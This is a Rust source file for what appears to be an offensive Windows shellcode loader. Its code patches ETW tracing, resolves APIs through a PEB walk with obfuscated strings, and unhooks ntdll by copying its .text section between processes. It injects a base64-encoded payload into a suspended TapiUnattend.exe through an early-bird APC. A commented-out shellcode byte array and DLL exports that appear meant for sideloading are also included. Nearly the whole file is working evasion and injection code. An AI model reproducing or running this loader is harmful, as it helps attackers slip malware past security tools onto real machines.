use std::{ptr::{null_mut, null}, mem::transmute, mem::size_of, collections::BTreeMap, ffi::{CStr, CString, c_void}, ops::Add, fs::File, io::Read};

use obfstr::obfstr as obf;
use base64::decode;
use ntapi::{
    ntpebteb::{PPEB},
    ntpsapi::{
        NtQueueApcThreadEx,
        PPS_APC_ROUTINE,
        NtResumeThread,
        NtTestAlert,
        NtCurrentThread,
        PPEB_LDR_DATA
    },
    ntldr::{PLDR_DATA_TABLE_ENTRY}
};

// use windows_sys::Win32::{
//     Foundation::GetLastError,
//     System::{
//         Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
//         Threading::{
//             CreateProcessA, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA,
//         },
//     },
// };

// use winapi::um::processthreadsapi::{CreateProcessA, OpenProcess, TerminateProcess, PROCESS_INFORMATION};
use winapi::{
    um::{
        processthreadsapi::{
            CreateProcessA ,
            OpenProcess,
            PROCESS_INFORMATION,
            PPROC_THREAD_ATTRIBUTE_LIST,
            STARTUPINFOA,
            TerminateProcess,
            InitializeProcThreadAttributeList,
            UpdateProcThreadAttribute
        },
        winbase::{
            STARTUPINFOEXA,
            EXTENDED_STARTUPINFO_PRESENT,
            CREATE_SUSPENDED,
            CREATE_NO_WINDOW
        },
        heapapi::{
            GetProcessHeap,
            HeapAlloc,
            HeapFree
        },
        memoryapi::{
            VirtualAllocExNuma
        },
        winnt::{
            HEAP_ZERO_MEMORY,
            IMAGE_DOS_HEADER,
            IMAGE_NT_HEADERS64,
            IMAGE_SECTION_HEADER,
            IMAGE_DIRECTORY_ENTRY_EXPORT,
            IMAGE_EXPORT_DIRECTORY,
            MEM_COMMIT,
            PAGE_READWRITE,
            PAGE_EXECUTE_READWRITE,
            MEM_RESERVE,
            PAGE_EXECUTE,
            PAGE_EXECUTE_READ,
            MAXIMUM_ALLOWED
        }
    },
    shared:: {
        ntdef::{
            PVOID,
            HANDLE,
            ULONG,
            PULONG,
            LPCSTR,
            NT_SUCCESS,
            NTSTATUS
        },
    },
};

const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON:usize = 0x00000001 << 44;
const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY:usize = 0x00020007;

const PEBOFFSET: u64 = 0x60;

pub fn __breakpoint() {
    unsafe{
        std::arch::asm!("int3");
    }
}

/*
for 64bit only
used to get PEB address with fs:offset
*/
#[inline(always)]
pub fn __readgsqword(offset: u64) -> u64 {
    let out: u64;
    unsafe {
        std::arch::asm!("mov {}, gs:[{}]",
        out(reg) out, in(reg) offset
        );
    }
    out
}

/*
We do a PEB walk to find given module address
*/
unsafe fn get_module_addr_by_name(module_name: &str) -> PVOID {
    let peb_ptr = __readgsqword(PEBOFFSET) as PPEB;
    println!("[+] PEB ptr: {:x?}", peb_ptr);

    let mut dll_base: PVOID = null_mut();
    // Get PEB LDR pointer and transmute to the struct
    let ptr_peb_ldr_data = transmute::<*mut _, PPEB_LDR_DATA>((*peb_ptr).Ldr);
    println!("[+] Peb LDR ptr: {:x?}", ptr_peb_ldr_data);

    /*
    Get module list from LDR and transmute to Table Entry struct
    LDR->InLoadOrderModuleList->Flink
    https://docs.rs/winapi/0.3.9/winapi/shared/ntdef/struct.LIST_ENTRY.html
    */
    let mut module_list = transmute::<*mut _, PLDR_DATA_TABLE_ENTRY>((*ptr_peb_ldr_data).InLoadOrderModuleList.Flink);
    println!("[+] Module list ptr: {:x?}", module_list);


    /*
    Traverse all modules
    Module->DllBase.Buffer == module_name
    */
    while !(*module_list).DllBase.is_null() {
        /*
        Convert BaseDllName.Buffer &[u16]
        To *mut u16
        Module struct in https://docs.rs/ntapi/latest/ntapi/ntldr/struct.LDR_DATA_TABLE_ENTRY.html
        */

        // let slice = core::slice::from_raw_parts((*module_list).BaseDllName.Buffer, (*module_list).BaseDllName.Length as usize / 2);
        // let dll_name = String::from_utf16(slice).unwrap();

        let slice = core::slice::from_raw_parts((*module_list).BaseDllName.Buffer, (*module_list).BaseDllName.Length as usize / 2);
        let dll_name = String::from_utf16(slice).unwrap();

        println!("[+] Current module : {} {:x?} (size: {})", dll_name, (*module_list).DllBase, (*module_list).SizeOfImage);

        // If we find the needed DLL, return ptr
        if dll_name.to_uppercase() == module_name.to_uppercase() {
            dll_base = (*module_list).DllBase;
            break
        }

        // Go to the next module
        module_list = transmute::<*mut _, PLDR_DATA_TABLE_ENTRY>((*module_list).InLoadOrderLinks.Flink);
    }

    return dll_base;
}

unsafe fn get_module_section_addr(module_base: PVOID, section: &str) -> *mut IMAGE_SECTION_HEADER {
    let dos_header = *(module_base as *mut IMAGE_DOS_HEADER);
    /*
    IMAGE_NT_HEADERS = ModuleBase + poi(ModuleBase->e_lfanew
    https://docs.rs/winapi/0.3.9/winapi/um/winnt/struct.IMAGE_NT_HEADERS64.html
    */
    let nt_header = (module_base as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    println!("[+] NT_HEADERS64 ptr {:x?}", nt_header);

    let section_header = (&(*nt_header).OptionalHeader as *const _ as usize + (*nt_header).FileHeader.SizeOfOptionalHeader as usize)
    as *mut IMAGE_SECTION_HEADER;
    println!("[+] Section headers ptr {:x?}", section_header);

    for i in 0..(*nt_header).FileHeader.NumberOfSections as usize {
        let sec_addr = section_header.add(i);
        let sec_name = (*sec_addr).Name;
        let name = std::str::from_utf8(&sec_name).unwrap();
        println!("[+] Section: {} ({:x?})", name, sec_addr);
        if name.contains(section) {
            return sec_addr
        }
    }
    0 as *mut IMAGE_SECTION_HEADER
}

unsafe fn get_module_export_lists(module_base: PVOID) -> BTreeMap<String, usize> {
    let mut result = BTreeMap::new();
    /*
    DOS_HEADER = module_base address 
    https://docs.rs/winapi/0.3.9/winapi/um/winnt/struct.IMAGE_DOS_HEADER.html
    */
    let dos_header = *(module_base as *mut IMAGE_DOS_HEADER);
    /*
    IMAGE_NT_HEADERS = ModuleBase + poi(ModuleBase->e_lfanew
    https://docs.rs/winapi/0.3.9/winapi/um/winnt/struct.IMAGE_NT_HEADERS64.html
    */
    let nt_header = (module_base as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    println!("[+] NT_HEADERS64 ptr {:x?}", nt_header);
    
    /*
    Export Directory = ModuleBase + poi(IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[0].VirtualAddress)
    https://docs.rs/winapi/0.3.9/winapi/um/winnt/struct.IMAGE_OPTIONAL_HEADER64.html
    */
    let export_directory = (module_base as usize
        + (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress as usize)
        as *mut IMAGE_EXPORT_DIRECTORY;
    println!("[+] Export dir ptr {:x?}", export_directory);

    /*
    Get Names / Functions / Ordinals into arrays of addresses 
    https://docs.rs/winapi/0.3.9/winapi/um/winnt/struct.IMAGE_EXPORT_DIRECTORY.html
    */
    let names = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNames as usize) as *const u32,
        (*export_directory).NumberOfNames as _,
    );
    let functions = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfFunctions as usize) as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );
    let ordinals = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNameOrdinals as usize)
            as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    println!("[+] Module Base: {:?}
    Export Directory: {:?}
    AddressOfNames: {names:p},
    AddressOfFunctions: {functions:p}
    AddressOfNameOrdinals: {ordinals:p} ", module_base, export_directory);

    // Now correlating them into BTree
    for i in 0..(*export_directory).NumberOfNames {
        // Name = ModuleBase + AddressOfNames[i]
        let name = (module_base as usize + names[i as usize] as usize) as *const i8;
        if let Ok(name) = CStr::from_ptr(name).to_str() {
            let function_ptr = (module_base as usize + functions[ordinals[i as usize] as usize] as usize) as usize;
            // println!("Function {} Ord: {} ({:x?})", name, ordinals[i as usize] as usize, function_ptr);
            result.insert(name.to_string(), function_ptr);

            if name.starts_with("Nt") {
                let data = core::slice::from_raw_parts(function_ptr as *const u8, 4);
                // let data2 = (function_ptr as *const u8).read();
                // print!("Data2 {:x?}: ",data2);
                if !data.starts_with(&[0x4c]) {
                    print!("{}: {:X}\n",name, data[0]);
                }
                if data.contains(&0xe9) {
                    print!("{}: ",name);
                    for b in data {
                        print!("0x{:X} ", b);
                    }
                    println!();
                }
            }
        }
    }

    return result
}

unsafe fn patch_etw(hprocess: HANDLE, nt_funcs: BTreeMap<String, usize>, k32_funcs: BTreeMap<String, usize>) -> bool {
    let written = null_mut() as PVOID;
    let nt_trace_ptr = nt_funcs.get(obf!("NtTraceControl")).unwrap();
    let mut base_address = *nt_trace_ptr as *mut c_void;

    println!("[+] NtTraceControl addr {:x?}", nt_trace_ptr);
    println!("[+] Bytes written addr {:p}", &written);
    let patch : Vec<u8>  = vec![0x4c, 0x8b, 0xd1, 0xC3];

    // __breakpoint();

    let res = transmute::<_, WriteProcessMemory>(*k32_funcs.get(obf!("WriteProcessMemory")).expect("OOOPS"))(
        hprocess,
        *nt_trace_ptr as PVOID,
        patch.as_ptr() as PVOID,
        patch.len() as PVOID,
        &written
    );
    return res
}


fn main() {
    let mut ntdll_addr = unsafe { get_module_addr_by_name(obf!("ntdll.dll")) };
    println!("[+] NTDLL ptr: {:x?}", ntdll_addr);
    assert_ne!(ntdll_addr as usize, 0);

    let mut kernel32_addr = unsafe { get_module_addr_by_name(obf!("kernel32.dll")) };
    println!("[+] Kernel32 ptr: {:x?}", kernel32_addr);
    assert_ne!(kernel32_addr as usize, 0);

    // NTDLL.dll functions
    let mut nt_functions = unsafe { get_module_export_lists(ntdll_addr) };
    for (name, addr) in nt_functions.to_owned() {
        // println!("[+] Function: {} ({:x?})", name, addr as PVOID);
    }

    // kernel32.dll functions
    let mut k32_functions = unsafe { get_module_export_lists(kernel32_addr) };
    for (name, addr) in k32_functions.to_owned() {
        // println!("[+] Function: {} ({:x?})", name, addr as PVOID);
    }

    unsafe {
        let patch_res = patch_etw(0xffffffffffffffff as HANDLE,nt_functions.to_owned(), k32_functions.to_owned());
        if patch_res != true {
            println!("[-] ETW failed to patch: {}", patch_res)
        }
    }

    let process_name = r"C:\Windows\System32\TapiUnattend.exe";
    let lp_command_line = CString::new(process_name).unwrap().into_raw() as _;

    // let mut startup_info = unsafe { std::mem::zeroed::<STARTUPINFOA>() };
    // let mut process_information = unsafe { std::mem::zeroed::<PROCESS_INFORMATION>() };

    let mut process_information:PROCESS_INFORMATION = PROCESS_INFORMATION::default();
    let mut si:STARTUPINFOEXA = STARTUPINFOEXA::default();
    let mut allocstart : *mut c_void = null_mut();

    let mut attributesize: usize =0;
    println!("[+] Now setting up the new process policy");
    let mut status;
    unsafe {
        status = InitializeProcThreadAttributeList(null_mut(),1,0, &mut attributesize);
        println!("[+] InitializeProcThreadAttributeList result: {:x}", status as usize);
        si.lpAttributeList= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,attributesize) as PPROC_THREAD_ATTRIBUTE_LIST;
        status = InitializeProcThreadAttributeList(si.lpAttributeList,1,0, &mut attributesize);
        println!("[+] InitializeProcThreadAttributeList result: {:x}", status as usize);

        let mut policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON as usize;
        println!("[+] Policy: {:x}", policy as usize);

        let mut result = UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
            policy as *mut c_void,
            size_of::<usize>(),
            null_mut(),
            null_mut()
        );
        println!("[+] UpdateProcThreadAttribute (Policy) result: {:x}", result);
        // let mut openproc: HANDLE = OpenProcess(0x02000000, 0, 2388);
        // println!("[+] OpenProc handle: {:X}", openproc as usize);
        // result = UpdateProcThreadAttribute(
        //     si.lpAttributeList,
        //     0,
        //     0 | 0x00020000,
        //     (&mut openproc) as *mut *mut c_void as *mut c_void,
        //     size_of::<HANDLE>(),
        //     null_mut(),
        //     null_mut()
        // );
        // println!("[+] UpdateProcThreadAttribute (PPID) result: {:x}", result);
    }

    let create_process_result = unsafe {
        CreateProcessA(
            null_mut(),
            lp_command_line,
            null_mut(),
            null_mut(),
            EXTENDED_STARTUPINFO_PRESENT as i32,
            0x00000004,
            null_mut(),
            null_mut(),
            &mut si.StartupInfo,
            &mut process_information,
        )
    };
    println!("[+] Process name: {}", process_name);
    println!("[+] Process ID: {}", process_information.dwProcessId);
    println!("[+] Process handle: {:x?}", process_information.hProcess);

    unsafe { copy_remote_ntdll_to_local_ntdll_text_section(ntdll_addr, kernel32_addr, ".text", process_information.hProcess as isize, k32_functions, nt_functions.to_owned()) }

    nt_functions = unsafe { get_module_export_lists(ntdll_addr) };
    k32_functions = unsafe { get_module_export_lists(kernel32_addr) };
    let psapi = unsafe { transmute::<_, LoadLibraryA>(*k32_functions.get("LoadLibraryA").expect("OOOPS"))(
            "psapi.dll\0".as_ptr()
    )};
    let psapi_functions = unsafe { get_module_export_lists(psapi) };

    // let mut buffer: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
    //     0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
    //     0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
    //     0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
    //     0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
    //     0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
    //     0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
    //     0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
    //     0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
    //     0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
    //     0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
    //     0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
    //     0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
    //     0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
    //     0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
    //     0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
    //     0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
    //     0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
    //     0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
    //     0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
    //     0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
    //     0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
    //     0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
    //     0x2e,0x65,0x78,0x65,0x00];
    // println!("[+] Buf Ptr {:x?}", buffer.as_mut_ptr() as PVOID);
 
    let my_str = include_str!("loader.b64");
    let mut file_contents = decode(my_str).expect("Failed to load load");
    let sss = file_contents.len();
    let mut buffer = file_contents.into_boxed_slice();
    println!("[+] Buf2 Ptr {:x?}", buffer.as_mut_ptr() as PVOID);

    let nt_avm_addr = nt_functions.get("NtAllocateVirtualMemory").unwrap();
    println!("[+] NtAllocateVitualMemory function address {:x?}", nt_avm_addr);
    let nt_avm = unsafe { transmute::<_, NtAllocateVirtualMemory>(*nt_avm_addr) };

    let nt_wvm_addr = nt_functions.get("NtWriteVirtualMemory").unwrap();
    println!("[+] NtWriteVirtualMemory function address {:x?}", nt_avm_addr);
    let nt_wvm = unsafe { transmute::<_, NtWriteVirtualMemory>(*nt_wvm_addr) };

    // let nt_cte_addr = nt_functions.get("NtCreateThreadEx").unwrap();
    // println!("[+] NtCreateThreadEx function address {:x?}", nt_cte_addr);
    // let nt_wvm = unsafe { transmute::<_, NtWriteVirtualMemory>(*nt_wvm_addr) };

    // let terminated = unsafe { TerminateProcess(process_information.hProcess, 101) };

    unsafe { 
        // let patch_res = patch_etw(0xffffffffffffffff as HANDLE,nt_functions.to_owned(), k32_functions.to_owned());
        // if patch_res != true {
        //     println!("[-] Status: {}", patch_res)
        // }

        let mut size = buffer.len() as usize;
        println!("[+] Buf Size {}", buffer.len());
        let mut base_address = std::ptr::null_mut();
        let status = transmute::<_, NtAllocateVirtualMemory>(*nt_functions.get("NtAllocateVirtualMemory").expect("OOOPS"))(
            0xffffffffffffffff as HANDLE,
            &mut base_address,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if status != 0 {
            println!("[-] NTSTATUS: {:x}", status)
        }
        println!("[+] NtAllocateVitualMemory Base address {:x?}", base_address);


        // we overwrite base_address with heap in target proc
        HeapFree(GetProcessHeap(),HEAP_ZERO_MEMORY,std::mem::transmute(si.lpAttributeList));
        base_address = VirtualAllocExNuma(
            process_information.hProcess,
            null_mut(),
            buffer.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,0
        );
        println!("[+] VirtualAllocExNuma Base address {:x?}", base_address);

        let bytes_written = null_mut() as PVOID;
        let status = transmute::<_, NtWriteVirtualMemory>(*nt_functions.get("NtWriteVirtualMemory").expect("OOOPS"))(
            // 0xffffffffffffffff as HANDLE,
            process_information.hProcess as HANDLE,
            base_address,
            buffer.as_mut_ptr() as PVOID,
            buffer.len() as PVOID,
            &bytes_written
        );
        if status != 0 {
            println!("[-] NTSTATUS: {:x}", status)
        }
        println!("[+] NtWriteVirtualMemory bytes written {}", bytes_written as usize);

        // let mut thread_handle = null_mut();
        // let status = transmute::<_, NtCreateThreadEx>(*nt_functions.get("NtCreateThreadEx").expect("OOOPS"))(
        //     &mut thread_handle,
        //     MAXIMUM_ALLOWED as PVOID,
        //     null_mut() as PVOID,
        //     0xffffffffffffffff as HANDLE,
        //     base_address,
        //     null_mut() as PVOID,
        //     0,
        //     0,
        //     0,
        //     0,
        //     null_mut()
        // );
        // if status != 0 {
        //     println!("[-] NTSTATUS: {:x}", status)
        // }
        // println!("[+] Thread handle: {:p}", thread_handle);
        // //NtWaitForSingleObject(thread_handle, 0, std::ptr::null_mut());
        // let status = transmute::<_, NtWaitForSingleObject>(*nt_functions.get("NtWaitForSingleObject").expect("OOOPS"))(
        //     thread_handle as HANDLE,
        //     0 as usize,
        //     null_mut() as PVOID
        // );
        // if status != 0 {
        //     println!("[-] NTSTATUS: {:x}", status)
        // }
        // pause();
    
        let mut old_protect = null_mut() as PVOID;
        let status = transmute::<_, NtProtectVirtualMemory>(*nt_functions.get("NtProtectVirtualMemory").expect("OOOPS"))(
            // 0xffffffffffffffff as HANDLE,
            process_information.hProcess as HANDLE,
            &base_address,
            &buffer.len(),
            PAGE_EXECUTE,
            &mut old_protect
        );
        if status != 0 {
            println!("[-] NTSTATUS: {:x}", status)
        }

        // let mut old_protect = null_mut() as PVOID;
        // let status = transmute::<_, EnumPageFilesW>(*psapi_functions.get("EnumPageFilesW").expect("OOOPS"))(
        //     base_address,
        //     0
        // );
        // if !status {
        //     println!("[-] EnumPageFilesW failed");
        // }

        let mut apc = NtQueueApcThreadEx(
            // NtCurrentThread,
            process_information.hThread,
            null_mut(),
            Some(transmute(base_address)) as PPS_APC_ROUTINE,
            base_address,
            null_mut(),
            null_mut()
        );
        if !NT_SUCCESS(apc) {
            println!("Well shit {:x}", apc);
        }
        apc = NtResumeThread(process_information.hThread, &mut 0);
        // wait a bit here?
        println!("[+] Now writing NTDLL .text back to child process since it might be hooked now");
        copy_local_ntdll_to_remote_ntdll_text_section(ntdll_addr, kernel32_addr, ".text", process_information.hProcess as isize, k32_functions, nt_functions.to_owned());
    };

    // status = NtAllocateVirtualMemory(handle, &mut base_address, 0, &mut shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

}

unsafe fn copy_local_ntdll_to_remote_ntdll_text_section(ntdll_addr: PVOID, kernel32_addr: PVOID,
        section: &str, proc_handle: isize, k32_functions: BTreeMap<String, usize>, nt_fucntions: BTreeMap<String, usize>) {
    let text_section = unsafe { get_module_section_addr(ntdll_addr, ".text") };
    assert_ne!(text_section as usize, 0);
    println!("[+] .text section addr: {:x?}", text_section);

    let vaddr = ntdll_addr as usize + (*text_section).VirtualAddress as usize;
    println!("[+] VirtualAddress (destination): {:x?}", vaddr as PVOID);

    let size = (*text_section).SizeOfRawData as usize;
    println!("[+] RawData size (source size): {}", size);

    // Create empty Vec buffer of bytes
    let mut ntdll_text_section_buffer: Vec<u8> = Vec::with_capacity(size as usize);
    println!("[+] NTDLL section buffer ptr: {:p}", ntdll_text_section_buffer.as_mut_ptr() as PVOID);

    let rpm_addr = k32_functions.get("ReadProcessMemory").unwrap();
    println!("[+] ReadProcessMemory Function ptr: {:x?}", rpm_addr);

    let wpm_addr = k32_functions.get("WriteProcessMemory").unwrap();
    println!("[+] WriteProcessMemory Function ptr: {:x?}", wpm_addr);

    let rpm = 
        unsafe { transmute::<_, ReadProcessMemory>(*rpm_addr) };

    let wpm = 
        unsafe { transmute::<_, WriteProcessMemory>(*wpm_addr) };

    let bytes_read = null_mut() as PVOID;
    let bytes_written = null_mut() as PVOID;

    // unsafe { __breakpoint() };
    // pause();

    let mut res = rpm(
        0xffffffffffffffff as HANDLE,
        vaddr as PVOID,
        ntdll_text_section_buffer.as_mut_ptr() as _,
        size as PVOID,
        &bytes_read
    );
    let slice = core::slice::from_raw_parts(ntdll_text_section_buffer.as_mut_ptr(), 20);
    for b in slice{
        print!("{:X?} ", b)
    }
    assert_eq!(res, true);
    println!();
    println!("[+] Bytes read to {:x?}: {}", ntdll_text_section_buffer.as_mut_ptr(), bytes_read as usize);

    // __breakpoint();

    res = wpm(proc_handle as HANDLE, vaddr as PVOID, ntdll_text_section_buffer.as_mut_ptr() as PVOID, size as PVOID, &bytes_written);
    assert_eq!(res, true);
    println!("[+] Bytes written: {}", bytes_written as usize);


}


unsafe fn copy_remote_ntdll_to_local_ntdll_text_section(ntdll_addr: PVOID, kernel32_addr: PVOID,
        section: &str, proc_handle: isize, k32_functions: BTreeMap<String, usize>, nt_fucntions: BTreeMap<String, usize>) {

    let text_section = unsafe { get_module_section_addr(ntdll_addr, ".text") };
    assert_ne!(text_section as usize, 0);
    println!("[+] .text section addr: {:x?}", text_section);

    /*
    NTDLL->.text->PointerToARawData
    https://docs.rs/winapi/0.3.9/winapi/um/winnt/struct.IMAGE_SECTION_HEADER.html
    */

    // let source = ntdll_addr as usize + (*text_section).PointerToRawData as usize;
    // println!("[+] PointerToRawData (source): {:x?}", source as PVOID);

    /*
    NTDLL->.text->VirtualAddress
    */
    let vaddr = ntdll_addr as usize + (*text_section).VirtualAddress as usize;
    println!("[+] VirtualAddress (destination): {:x?}", vaddr as PVOID);

    let size = (*text_section).SizeOfRawData as usize;
    println!("[+] RawData size (source size): {}", size);

    // Create empty Vec buffer of bytes
    let mut ntdll_text_section_buffer: Vec<u8> = Vec::with_capacity(size as usize);
    println!("[+] NTDLL section buffer ptr: {:p}", ntdll_text_section_buffer.as_mut_ptr() as PVOID);

    let rpm_addr = k32_functions.get("ReadProcessMemory").unwrap();
    println!("[+] ReadProcessMemory Function ptr: {:x?}", rpm_addr);

    let wpm_addr = k32_functions.get("WriteProcessMemory").unwrap();
    println!("[+] WriteProcessMemory Function ptr: {:x?}", wpm_addr);

    let rpm = 
        unsafe { transmute::<_, ReadProcessMemory>(*rpm_addr) };

    let wpm = 
        unsafe { transmute::<_, WriteProcessMemory>(*wpm_addr) };

    let bytes_read = null_mut() as PVOID;
    let bytes_written = null_mut() as PVOID;

    // unsafe { __breakpoint() };
    // pause();

    let mut res = rpm(
        proc_handle as HANDLE,
        vaddr as PVOID,
        ntdll_text_section_buffer.as_mut_ptr() as _,
        size as PVOID,
        &bytes_read
    );
    let slice = core::slice::from_raw_parts(ntdll_text_section_buffer.as_mut_ptr(), 20);
    for b in slice{
        print!("{:X?} ", b)
    }
    assert_eq!(res, true);
    println!();
    println!("[+] Bytes read to {:x?}: {}", ntdll_text_section_buffer.as_mut_ptr(), bytes_read as usize);

    // __breakpoint();

    res = wpm(0xffffffffffffffff as HANDLE, vaddr as PVOID, ntdll_text_section_buffer.as_mut_ptr() as PVOID, size as PVOID, &bytes_written);
    assert_eq!(res, true);
    println!("[+] Bytes written: {}", bytes_written as usize);
    // println!("[+] NTSTATUS: {:x?}", ntstatus);
    // assert_eq!(ntstatus, 0);


}

type NtAllocateVirtualMemory = unsafe extern "system" fn(
ProcessHandle: HANDLE, 
    BaseAddress:&PVOID, 
    ZeroBits: ULONG, 
    RegionSize: &usize, 
    AllocationType: ULONG, 
    Protect: ULONG
) -> NTSTATUS;

type LoadLibraryA = unsafe extern "system" fn(
    FileName: *const u8
) -> PVOID;

type EnumPageFilesW = unsafe extern "system" fn(
    Callback: PVOID, 
    Context: usize
) -> bool;

// NTSTATUS NtWaitForSingleObject(
//   [in] HANDLE         Handle,
//   [in] BOOLEAN        Alertable,
//   [in] PLARGE_INTEGER Timeout
// );

type NtWaitForSingleObject=  unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    Alertable: usize,
    LargeInteger: PVOID,
) -> NTSTATUS;

type NtProtectVirtualMemory =  unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: &PVOID,
    RegionSize: &usize,
    NewProtect: ULONG,
    OldProtect: &PVOID
) -> NTSTATUS;

type NtCreateThreadEx = unsafe extern "system" fn(
    ThreadHandle: &HANDLE,      //&mut thread
    DesiredAccess: PVOID,       //MAXIMUM_ALLOWED
    ObjectAttributes: PVOID,    // null_mut()
    ProcessHandle: HANDLE,      //0xffffffffff
    StartRoutine: PVOID,        //base_address
    Argument: PVOID,            //null_mut()
    CreateFlags: usize,         //0
    ZeroBits: usize,            //0
    StackSize: usize,           //0
    MaximumStackSize: usize,    //0
    AttributeList: PVOID        //null_mut()
) -> NTSTATUS;

type NtReadVirtualMemory = unsafe extern "system" fn(
    ProcessHandle: HANDLE, 
    BaseAddress: PVOID, 
    Buffer: PVOID, 
    NumberOfBytesToRead: PVOID,
    NumberOfBytesReaded: &PVOID
) -> NTSTATUS;


type NtWriteVirtualMemory = unsafe extern "system" fn(
    ProcessHandle: HANDLE, 
    BaseAddress: PVOID, 
    Buffer: PVOID, 
    NumberOfBytesToWrite: PVOID,
    NumberOfBytesWritten: &PVOID
) -> NTSTATUS;


type ReadProcessMemory = unsafe extern "system" fn(
    ProcessHandle: HANDLE, 
    BaseAddress: PVOID, 
    Buffer: PVOID, 
    NumberOfBytesToRead: PVOID,
    NumberOfBytesReaded: &PVOID
) -> bool;

type WriteProcessMemory = unsafe extern "system" fn(
    ProcessHandle: HANDLE, 
    BaseAddress: PVOID, 
    Buffer: PVOID, 
    NumberOfBytesToWrite: PVOID,
    NumberOfBytesWritten: &PVOID
) -> bool;


#[allow(dead_code)]
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}
#[allow(dead_code)]
/// Used for debugging
fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}

#[no_mangle]
pub extern "C" fn CurrentIP() {
    unsafe { main() };
}

#[no_mangle]
pub extern "C" fn ConstructPartialMsgVW() {
    unsafe { main() };
}

#[no_mangle]
pub extern "C" fn WdsSetupLogMessageW() {
    unsafe { main() };
}